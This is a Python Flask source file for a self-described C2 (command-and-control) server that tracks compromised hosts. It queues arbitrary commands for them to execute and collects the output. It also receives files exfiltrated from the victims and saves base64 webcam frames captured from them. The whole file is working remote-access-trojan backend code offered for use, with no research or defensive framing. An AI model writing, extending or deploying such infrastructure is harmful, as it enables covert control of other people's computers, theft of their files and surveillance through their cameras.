#!/usr/bin/env python3
"""
Fixed C2 Server with Proper Client Status Tracking
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
import base64
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Configuration
DATABASE = 'c2_server.db'
ONLINE_THRESHOLD = 120  # 2 minutes before marking offline
CLEANUP_INTERVAL = 300  # 5 minutes

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Clients table with unique constraint
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            arch TEXT,
            ip TEXT,
            last_seen REAL,
            status TEXT DEFAULT 'online',
            camera_count INTEGER DEFAULT 0,
            first_seen REAL,
            checkin_count INTEGER DEFAULT 0
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            output TEXT,
            created_at REAL,
            executed_at REAL,
            FOREIGN KEY (client_id) REFERENCES clients (id) ON DELETE CASCADE
        )
    ''')
    
    # Files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            filename TEXT,
            filepath TEXT,
            filesize INTEGER,
            uploaded_at REAL,
            FOREIGN KEY (client_id) REFERENCES clients (id) ON DELETE CASCADE
        )
    ''')
    
    # Create indexes for faster queries
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)')
    
    conn.commit()
    conn.close()

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# === CLIENT ENDPOINTS ===

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client checkin - Fixed to handle multiple clients from same device"""
    try:
        data = request.json
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        # Get client IP (use X-Forwarded-For if behind proxy)
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        conn = get_db()
        cursor = conn.cursor()
        
        # Check if client exists
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing = cursor.fetchone()
        
        current_time = time.time()
        
        if existing:
            # Update existing client
            cursor.execute('''
                UPDATE clients 
                SET last_seen = ?, status = 'online', checkin_count = checkin_count + 1,
                    hostname = COALESCE(?, hostname),
                    username = COALESCE(?, username),
                    os = COALESCE(?, os),
                    arch = COALESCE(?, arch),
                    camera_count = COALESCE(?, camera_count)
                WHERE id = ?
            ''', (
                current_time,
                data.get('hostname'),
                data.get('username'),
                data.get('os'),
                data.get('arch'),
                data.get('camera_count', 0),
                client_id
            ))
        else:
            # Insert new client
            cursor.execute('''
                INSERT INTO clients 
                (id, hostname, username, os, arch, ip, last_seen, status, 
                 camera_count, first_seen, checkin_count)
                VALUES (?, ?, ?, ?, ?, ?, ?, 'online', ?, ?, 1)
            ''', (
                client_id,
                data.get('hostname', 'unknown'),
                data.get('username', 'unknown'),
                data.get('os', 'unknown'),
                data.get('arch', 'unknown'),
                client_ip,
                current_time,
                data.get('camera_count', 0),
                current_time
            ))
        
        conn.commit()
        
        # Get updated client info
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        conn.close()
        
        print(f"[✓] Checkin: {client_id} ({data.get('hostname')}) - IP: {client_ip}")
        
        return jsonify({
            'status': 'ok',
            'timestamp': current_time,
            'client_id': client_id,
            'message': 'Checkin successful'
        }), 200
        
    except Exception as e:
        print(f"[✗] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        # Verify client exists and is online
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT status FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        cmd_id = str(uuid.uuid4())
        current_time = time.time()
        
        # Insert command
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        ''', (cmd_id, client_id, command, current_time))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Command: {cmd_id[:8]} -> {client_id}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued',
            'timestamp': current_time
        }), 200
        
    except Exception as e:
        print(f"[✗] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    """Get pending commands for client"""
    try:
        # First, update client's last_seen
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('UPDATE clients SET last_seen = ? WHERE id = ?', 
                      (time.time(), client_id))
        
        # Get pending commands
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 10
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command']
            })
        
        # Mark as sent
        if commands:
            cmd_ids = [cmd['id'] for cmd in commands]
            placeholders = ','.join(['?' for _ in cmd_ids])
            cursor.execute(f'''
                UPDATE commands SET status = 'sent'
                WHERE id IN ({placeholders})
            ''', cmd_ids)
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        print(f"[✗] Get commands error: {e}")
        return jsonify({'commands': []}), 500

@app.route('/api/result', methods=['POST'])
def submit_result():
    """Submit command result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        # Update command status
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', output = ?, executed_at = ?
            WHERE id = ?
        ''', (output, time.time(), cmd_id))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Result: {cmd_id[:8]} -> {len(output)} chars")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        print(f"[✗] Result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_result(cmd_id):
    """Get command result"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM commands WHERE id = ?', (cmd_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'status': row['status'],
                'output': row['output'] or '',
                'command': row['command'],
                'created_at': row['created_at'],
                'executed_at': row['executed_at']
            }), 200
        else:
            return jsonify({'error': 'Command not found'}), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === FILE TRANSFER ENDPOINTS ===

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file from client"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        
        if not client_id:
            return jsonify({'error': 'No client_id'}), 400
        
        # Create uploads directory
        upload_dir = 'uploads'
        os.makedirs(upload_dir, exist_ok=True)
        
        # Save file
        filename = f"{client_id}_{int(time.time())}_{file.filename}"
        filepath = os.path.join(upload_dir, filename)
        file.save(filepath)
        
        # Save to database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO files (id, client_id, filename, filepath, filesize, uploaded_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (str(uuid.uuid4()), client_id, file.filename, filepath, 
              os.path.getsize(filepath), time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Upload: {client_id} -> {file.filename} ({os.path.getsize(filepath)} bytes)")
        
        return jsonify({
            'success': True,
            'filename': file.filename,
            'size': os.path.getsize(filepath),
            'saved_as': filename
        }), 200
        
    except Exception as e:
        print(f"[✗] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/<client_id>', methods=['GET'])
def list_files(client_id):
    """List files for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, filename, filesize, uploaded_at 
            FROM files 
            WHERE client_id = ?
            ORDER BY uploaded_at DESC
            LIMIT 20
        ''', (client_id,))
        
        files = []
        for row in cursor.fetchall():
            files.append({
                'id': row['id'],
                'filename': row['filename'],
                'size': row['filesize'],
                'uploaded_at': row['uploaded_at'],
                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S')
            })
        
        conn.close()
        return jsonify({'files': files}), 200
        
    except Exception as e:
        return jsonify({'files': []}), 500

@app.route('/api/download/<file_id>', methods=['GET'])
def download_file(file_id):
    """Download file"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT filepath, filename FROM files WHERE id = ?', (file_id,))
        row = cursor.fetchone()
        conn.close()
        
        if not row or not os.path.exists(row['filepath']):
            return jsonify({'error': 'File not found'}), 404
        
        return send_file(
            row['filepath'],
            as_attachment=True,
            download_name=row['filename']
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === CAMERA ENDPOINTS ===

@app.route('/api/camera/frame', methods=['POST'])
def camera_frame():
    """Receive camera frame"""
    try:
        data = request.form
        client_id = data.get('client_id')
        frame = data.get('frame')
        
        if not client_id or not frame:
            return jsonify({'error': 'Missing data'}), 400
        
        # Save frame
        camera_dir = 'camera_frames'
        os.makedirs(camera_dir, exist_ok=True)
        
        filename = f"{client_id}_{int(time.time())}.jpg"
        filepath = os.path.join(camera_dir, filename)
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(frame))
        
        print(f"[✓] Camera: {client_id} -> {filename}")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === MANAGEMENT ENDPOINTS ===

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get all clients with accurate status"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Update status based on last_seen
        cursor.execute('''
            UPDATE clients 
            SET status = CASE 
                WHEN ? - last_seen > ? THEN 'offline'
                ELSE 'online'
            END
        ''', (current_time, ONLINE_THRESHOLD))
        
        conn.commit()
        
        # Get all clients
        cursor.execute('''
            SELECT *, 
                   CASE 
                       WHEN ? - last_seen <= 60 THEN '🟢 online'
                       WHEN ? - last_seen <= 300 THEN '🟡 away'
                       ELSE '🔴 offline'
                   END as display_status
            FROM clients 
            ORDER BY 
                CASE 
                    WHEN ? - last_seen <= 60 THEN 1
                    WHEN ? - last_seen <= 300 THEN 2
                    ELSE 3
                END,
                last_seen DESC
        ''', (current_time, current_time, current_time))
        
        clients = []
        for row in cursor.fetchall():
            clients.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'arch': row['arch'],
                'ip': row['ip'],
                'status': row['status'],
                'display_status': row['display_status'],
                'camera_count': row['camera_count'],
                'last_seen': row['last_seen'],
                'first_seen': row['first_seen'],
                'checkin_count': row['checkin_count'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S'),
                'first_seen_str': datetime.fromtimestamp(row['first_seen']).strftime('%Y-%m-%d'),
                'uptime': f"{int((current_time - row['first_seen']) / 3600)}h" if row['first_seen'] else 'N/A'
            })
        
        conn.close()
        return jsonify({'clients': clients}), 200
        
    except Exception as e:
        print(f"[✗] Clients error: {e}")
        return jsonify({'clients': []}), 500

@app.route('/api/client/<client_id>', methods=['GET'])
def get_client(client_id):
    """Get specific client details"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Get command history
        cursor.execute('''
            SELECT * FROM commands 
            WHERE client_id = ? 
            ORDER BY created_at DESC 
            LIMIT 20
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append(dict(row))
        
        # Get file history
        cursor.execute('''
            SELECT * FROM files 
            WHERE client_id = ? 
            ORDER BY uploaded_at DESC 
            LIMIT 10
        ''', (client_id,))
        
        files = []
        for row in cursor.fetchall():
            files.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'client': dict(client),
            'commands': commands,
            'files': files,
            'current_time': time.time()
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        current_time = time.time()
        
        # Counts
        cursor.execute('SELECT COUNT(*) FROM clients')
        total_clients = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
        online_now = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 300', (current_time,))
        active_recently = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM commands')
        total_commands = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
        pending_commands = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files')
        total_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(DISTINCT ip) FROM clients')
        unique_ips = cursor.fetchone()[0]
        
        # Get OS distribution
        cursor.execute('SELECT os, COUNT(*) as count FROM clients GROUP BY os')
        os_dist = {row['os']: row['count'] for row in cursor.fetchall()}
        
        conn.close()
        
        return jsonify({
            'total_clients': total_clients,
            'online_now': online_now,
            'active_recently': active_recently,
            'total_commands': total_commands,
            'pending_commands': pending_commands,
            'total_files': total_files,
            'unique_ips': unique_ips,
            'os_distribution': os_dist,
            'server_time': current_time,
            'server_uptime': current_time - app_start_time if 'app_start_time' in globals() else 0,
            'online_threshold': ONLINE_THRESHOLD
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT 1')
        conn.close()
        
        return jsonify({
            'status': 'healthy',
            'timestamp': time.time(),
            'database': 'ok',
            'version': '2.1'
        }), 200
    except:
        return jsonify({'status': 'database_error'}), 500

@app.route('/api/ping', methods=['GET', 'POST'])
def ping():
    """Simple ping endpoint"""
    return jsonify({
        'status': 'pong',
        'timestamp': time.time(),
        'method': request.method
    }), 200

@app.route('/')
def index():
    """Home page"""
    return '''
    <html>
    <head>
        <title>C2 Server - Fixed</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .container { max-width: 800px; margin: 0 auto; }
            .card { background: #f5f5f5; padding: 20px; margin: 20px 0; border-radius: 5px; }
            .endpoint { background: #e9e9e9; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }
            .status { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 12px; }
            .online { background: #d4edda; color: #155724; }
            .offline { background: #f8d7da; color: #721c24; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🖥️ C2 Control Server - Fixed</h1>
            <p>Server is running with proper client status tracking.</p>
            
            <div class="card">
                <h3>📊 Quick Stats</h3>
                <div id="stats">Loading...</div>
            </div>
            
            <div class="card">
                <h3>🔗 API Endpoints:</h3>
                <div class="endpoint"><b>POST</b> /api/checkin - Client registration</div>
                <div class="endpoint"><b>POST</b> /api/command - Send commands</div>
                <div class="endpoint"><b>GET</b> /api/clients - List clients (fixed status)</div>
                <div class="endpoint"><b>POST</b> /api/upload - File upload</div>
                <div class="endpoint"><b>GET</b> /api/stats - Server statistics</div>
                <div class="endpoint"><b>GET</b> /api/health - Health check</div>
            </div>
            
            <p>Use the C2 console for control: <code>python c2_console_fixed_status.py http://localhost:5000</code></p>
        </div>
        
        <script>
            async function loadStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    
                    let html = '<ul>';
                    html += `<li>Total Clients: ${data.total_clients}</li>`;
                    html += `<li>Online Now: ${data.online_now}</li>`;
                    html += `<li>Total Commands: ${data.total_commands}</li>`;
                    html += `<li>Pending Commands: ${data.pending_commands}</li>`;
                    html += `<li>Server Uptime: ${Math.floor(data.server_uptime / 60)} minutes</li>`;
                    html += '</ul>';
                    
                    document.getElementById('stats').innerHTML = html;
                } catch (error) {
                    document.getElementById('stats').innerHTML = 'Error loading stats';
                }
            }
            
            loadStats();
            setInterval(loadStats, 10000); // Refresh every 10 seconds
        </script>
    </body>
    </html>
    '''

def cleanup_old_data():
    """Cleanup old data periodically"""
    while True:
        time.sleep(CLEANUP_INTERVAL)
        try:
            conn = get_db()
            cursor = conn.cursor()
            current_time = time.time()
            
            # Remove very old offline clients (7 days)
            cursor.execute('''
                DELETE FROM clients 
                WHERE status = 'offline' AND ? - last_seen > 604800
            ''', (current_time,))
            
            deleted_clients = cursor.rowcount
            
            # Remove old completed commands (30 days)
            cursor.execute('''
                DELETE FROM commands 
                WHERE status = 'completed' AND ? - executed_at > 2592000
            ''', (current_time,))
            
            deleted_commands = cursor.rowcount
            
            # Remove old files (60 days)
            cursor.execute('''
                DELETE FROM files 
                WHERE ? - uploaded_at > 5184000
            ''', (current_time,))
            
            deleted_files = cursor.rowcount
            
            conn.commit()
            conn.close()
            
            if deleted_clients or deleted_commands or deleted_files:
                print(f"[🗑️] Cleanup: {deleted_clients} clients, {deleted_commands} commands, {deleted_files} files")
            
        except Exception as e:
            print(f"[✗] Cleanup error: {e}")

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Start cleanup thread
    threading.Thread(target=cleanup_old_data, daemon=True).start()
    
    app_start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║                C2 SERVER v2.1 - STATUS FIXED            ║
║               Proper Client Status Tracking             ║
╚══════════════════════════════════════════════════════════╝

    📊 Database: {DATABASE}
    📁 Uploads: ./uploads/
    📷 Camera: ./camera_frames/
    
    ⚡ Online Threshold: {ONLINE_THRESHOLD} seconds
    🗑️ Cleanup Interval: {CLEANUP_INTERVAL} seconds
    
    🔗 Server running on: http://0.0.0.0:5000
    📡 API ready for connections
    
    Endpoints:
    • POST /api/checkin     - Client checkin (fixed)
    • POST /api/command     - Send command
    • GET  /api/clients     - List clients (accurate status)
    • GET  /api/stats       - Detailed statistics
    • GET  /api/health      - Health check
    
    Starting server...
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
